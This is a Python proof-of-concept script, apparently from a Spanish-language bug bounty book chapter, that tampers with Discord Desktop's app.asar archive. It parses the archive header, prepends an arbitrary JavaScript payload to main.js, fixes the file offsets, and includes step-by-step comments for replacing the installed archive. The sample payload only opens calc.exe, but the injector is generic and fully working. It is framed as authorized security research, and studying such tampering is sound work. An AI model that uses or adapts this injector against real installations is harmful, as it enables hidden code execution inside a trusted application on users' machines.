# Extraído de: LibroBugBounty/cap-05-asar-tampering.md
#!/usr/bin/env python3
"""
PoC de ASAR tampering para Discord Desktop.
Demuestra inyecciÃ³n de cÃ³digo JavaScript en app.asar.

AVISO: Solo para investigaciÃ³n de seguridad autorizada.
No ejecutar sin autorizaciÃ³n del vendor.
"""
import json
import struct
import shutil
from pathlib import Path

def read_asar_header(asar_path: str) -> tuple[dict, int]:
    """Lee el header JSON del ASAR y devuelve el data offset."""
    with open(asar_path, "rb") as f:
        f.read(4)  # pickle size
        header_size = struct.unpack("<I", f.read(4))[0]
        json_size = struct.unpack("<I", f.read(4))[0]
        f.read(4)  # padding
        header = json.loads(f.read(json_size).decode("utf-8"))
        data_offset = 16 + header_size
        return header, data_offset


def extract_file(asar_path: str, header: dict,
                 data_offset: int, file_path: str) -> bytes:
    """Extrae un fichero del ASAR por su ruta interna."""
    parts = file_path.split("/")
    node = header
    for part in parts:
        node = node["files"][part]

    with open(asar_path, "rb") as f:
        f.seek(data_offset + int(node["offset"]))
        return f.read(node["size"])


def tamper_asar(original_asar: str, output_asar: str,
                payload_js: str):
    """Modifica el ASAR inyectando payload en main.js."""
    header, data_offset = read_asar_header(original_asar)

    # Leer todos los datos originales
    with open(original_asar, "rb") as f:
        f.seek(data_offset)
        all_data = f.read()

    # Encontrar main.js en la estructura
    main_node = header["files"]["app"]["files"]["main.js"]
    original_offset = int(main_node["offset"])
    original_size = main_node["size"]

    # Extraer main.js original
    original_main = all_data[original_offset:original_offset + original_size]

    # Inyectar payload al inicio de main.js
    tampered_main = payload_js.encode("utf-8") + b"\n" + original_main
    size_diff = len(tampered_main) - original_size

    # Reconstruir datos: antes + tampered + despuÃ©s
    new_data = (
        all_data[:original_offset] +
        tampered_main +
        all_data[original_offset + original_size:]
    )

    # Actualizar tamaÃ±o de main.js en el header
    main_node["size"] = len(tampered_main)

    # Recalcular offsets de ficheros posteriores a main.js
    def update_offsets(node, threshold, diff):
        if "files" in node:
            for child in node["files"].values():
                update_offsets(child, threshold, diff)
        elif "offset" in node:
            if int(node["offset"]) > threshold:
                node["offset"] = str(int(node["offset"]) + diff)

    update_offsets(header, original_offset, size_diff)

    # Reescribir ASAR
    header_json = json.dumps(header, separators=(",", ":")).encode("utf-8")
    header_size = len(header_json)

    # Calcular padding para alinear a 4 bytes
    padding = (4 - (header_size % 4)) % 4
    padded_header_size = header_size + padding

    with open(output_asar, "wb") as f:
        f.write(struct.pack("<I", 4))  # pickle size
        f.write(struct.pack("<I", padded_header_size + 8))
        f.write(struct.pack("<I", padded_header_size + 4))
        f.write(struct.pack("<I", header_size))
        f.write(header_json)
        f.write(b"\x00" * padding)
        f.write(new_data)


# Payload de PoC: ejecuta calc.exe al iniciar Discord
# Demuestra RCE sin causar daÃ±o
POC_PAYLOAD = """
// === SECURITY RESEARCH PoC â€” ASAR TAMPERING ===
// Demuestra ejecuciÃ³n de cÃ³digo arbitrario
// Report: DISCORD-2026-001
const { execSync } = require('child_process');
try {
    execSync('calc.exe');
} catch(e) {}
// === END PoC ===
"""

# Uso:
# 1. Copiar app.asar original como backup
# shutil.copy2("resources/app.asar", "resources/app.asar.bak")
#
# 2. Generar ASAR tampered
# tamper_asar("resources/app.asar", "resources/app_tampered.asar", POC_PAYLOAD)
#
# 3. Reemplazar original
# shutil.move("resources/app_tampered.asar", "resources/app.asar")
#
# 4. Iniciar Discord â€” calc.exe se abre
